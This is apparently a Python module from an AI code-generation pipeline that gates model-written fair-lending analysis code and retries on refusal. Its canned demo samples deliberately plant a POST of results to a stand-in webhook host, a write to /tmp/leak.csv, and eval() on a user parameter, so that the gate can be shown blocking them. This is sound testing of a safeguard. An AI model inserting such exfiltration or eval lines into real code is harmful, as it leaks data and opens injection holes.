"""Stage 4 (Generate) and the Stage-5 regenerate loop.

The model writes code; the gate reads it; on refusal the failure is fed back and
the model tries again, up to a cap, then it hands to a human. In scripted mode
the "generation" is a canned analysis so the public demo is free and
deterministic, but the gate still does the real work on real code: a canned
sample that genuinely contains a webhook is genuinely blocked. Nothing about the
block is faked; only the model call is skipped.

Live mode calls the model from the actual question (the "live from the start"
decision). The seeded adversarial prompts (tests) drive real generations that the
gate must catch.
"""

from __future__ import annotations

from dataclasses import dataclass, field

from ..gateway.model_gateway import CodeGen, ModelGateway
from .gate import GateResult, gate_code
from .prompts import build_system_prompt, build_user_prompt

# -- canned analyses for scripted mode -------------------------------------
# Keyed by intent. The benign fair-lending analysis is real, executable code
# that emits the grouped table the Screen stage consumes. The others carry a
# single deliberate violation so the gate can be demonstrated blocking genuine
# code offline. Live mode ignores these and uses the model's own output.
INTENT_FAIR_LENDING = "fair_lending"
INTENT_EXFILTRATE = "exfiltrate"
INTENT_FILE_WRITE = "file_write"
INTENT_DYNAMIC = "dynamic"

_FAIR_LENDING_CODE = '''\
import fairlearn.metrics as flm
df = ctx.table("german_credit")
mf = flm.MetricFrame(
    metrics={"selection_rate": flm.selection_rate, "n": flm.count},
    y_true=df["y"],
    y_pred=df["pred"],
    sensitive_features=df["age_band"],
)
result = mf.by_group.reset_index()
result = result.rename(columns={"age_band": "band"})
ctx.emit(result)
'''

_EXFILTRATE_CODE = '''\
import fairlearn.metrics as flm
df = ctx.table("german_credit")
mf = flm.MetricFrame(
    metrics={"selection_rate": flm.selection_rate, "n": flm.count},
    y_true=df["y"],
    y_pred=df["pred"],
    sensitive_features=df["age_band"],
)
result = mf.by_group.reset_index().rename(columns={"age_band": "band"})
requests.post("https://ops.example.com/hook", json=result.to_dict())
ctx.emit(result)
'''

_FILE_WRITE_CODE = '''\
import fairlearn.metrics as flm
df = ctx.table("german_credit")
mf = flm.MetricFrame(
    metrics={"selection_rate": flm.selection_rate, "n": flm.count},
    y_true=df["y"],
    y_pred=df["pred"],
    sensitive_features=df["age_band"],
)
result = mf.by_group.reset_index().rename(columns={"age_band": "band"})
open("/tmp/leak.csv", "w").write(result.to_csv())
ctx.emit(result)
'''

_DYNAMIC_CODE = '''\
import fairlearn.metrics as flm
df = ctx.table("german_credit")
spec = eval(ctx.param("metric_spec"))
mf = flm.MetricFrame(
    metrics={"selection_rate": flm.selection_rate, "n": flm.count},
    y_true=df["y"],
    y_pred=df["pred"],
    sensitive_features=df["age_band"],
)
ctx.emit(mf.by_group.reset_index().rename(columns={"age_band": "band"}))
'''

_TEMPLATED_CODE: dict[str, str] = {
    INTENT_FAIR_LENDING: _FAIR_LENDING_CODE,
    INTENT_EXFILTRATE: _EXFILTRATE_CODE,
    INTENT_FILE_WRITE: _FILE_WRITE_CODE,
    INTENT_DYNAMIC: _DYNAMIC_CODE,
}


@dataclass
class CodeGenRequest:
    """Everything Generate needs: the question and the scope it runs in."""

    question: str
    table: str = "german_credit"
    granted_columns: list[str] = field(
        default_factory=lambda: ["age_band", "y", "pred"]
    )
    protected_attribute: str = "age_band"
    analysis: str = "fair_lending_selection_rate"
    # Scripted-mode selector; ignored in live mode.
    intent: str = INTENT_FAIR_LENDING


@dataclass
class GenerationAttempt:
    """One generate-then-gate cycle."""

    attempt: int
    code: str
    gate: GateResult
    codegen: CodeGen


@dataclass
class GenerationOutcome:
    """The result of Generate + the Stage-5 regenerate loop."""

    passed: bool
    code: str
    gate: GateResult
    attempts: list[GenerationAttempt]
    live: bool
    tokens: int
    cost_usd: float

    @property
    def attempt_count(self) -> int:
        return len(self.attempts)


def _scripted_fallback(request: CodeGenRequest) -> str:
    return _TEMPLATED_CODE.get(request.intent, _FAIR_LENDING_CODE)


def generate(
    request: CodeGenRequest,
    gateway: ModelGateway,
    *,
    feedback: str = "",
) -> CodeGen:
    """Generate one code string. Live mode calls the model; scripted mode returns
    the canned analysis for the request's intent. `feedback` from a prior gate
    refusal is appended to the prompt so the model can fix and retry."""
    system = build_system_prompt()
    user = build_user_prompt(
        question=request.question,
        table=request.table,
        granted_columns=request.granted_columns,
        protected_attribute=request.protected_attribute,
        analysis=request.analysis,
    )
    if feedback:
        user += f"\n\nYour previous attempt was refused by the gate. {feedback}"
    return gateway.generate_code(system, user, _scripted_fallback(request))


def generate_and_gate(
    request: CodeGenRequest,
    gateway: ModelGateway,
    *,
    max_attempts: int = 3,
) -> GenerationOutcome:
    """Generate, gate, and regenerate on refusal up to `max_attempts` (Stage 5).

    Returns as soon as the gate passes, or after the last attempt still fails, in
    which case the caller hands to a human. The column grant is enforced by the
    gate via CTL-COL-01 using the request's granted columns.
    """
    attempts: list[GenerationAttempt] = []
    tokens = 0
    cost = 0.0
    live = False
    feedback = ""

    for i in range(1, max_attempts + 1):
        cg = generate(request, gateway, feedback=feedback)
        tokens += cg.tokens
        cost += cg.cost_usd
        live = live or cg.live
        result = gate_code(cg.code, granted_columns=request.granted_columns)
        attempts.append(
            GenerationAttempt(attempt=i, code=cg.code, gate=result, codegen=cg)
        )
        if result.passed:
            break
        feedback = result.feedback_for_regeneration()
        # Scripted mode is deterministic: a refused canned sample will not change
        # on retry, so stop rather than burn identical attempts.
        if not cg.live:
            break

    last = attempts[-1]
    return GenerationOutcome(
        passed=last.gate.passed,
        code=last.code,
        gate=last.gate,
        attempts=attempts,
        live=live,
        tokens=tokens,
        cost_usd=round(cost, 6),
    )
